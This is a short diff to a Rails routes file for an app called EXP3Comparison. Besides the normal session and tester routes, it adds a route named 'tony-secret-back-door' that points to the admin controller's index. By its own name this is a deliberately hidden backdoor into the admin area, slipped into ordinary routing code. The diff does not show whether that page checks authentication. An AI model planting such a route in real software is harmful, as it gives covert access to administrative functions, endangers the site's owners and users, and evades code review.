@@ -2,6 +2,7 @@ EXP3Comparison::Application.routes.draw do
 
   resources :sessions, :only => [:new, :create, :index]
   resources :testers
+  match 'tony-secret-back-door' => 'admin#index'
 
   # The priority is based upon order of creation:
   # first created -> highest priority.
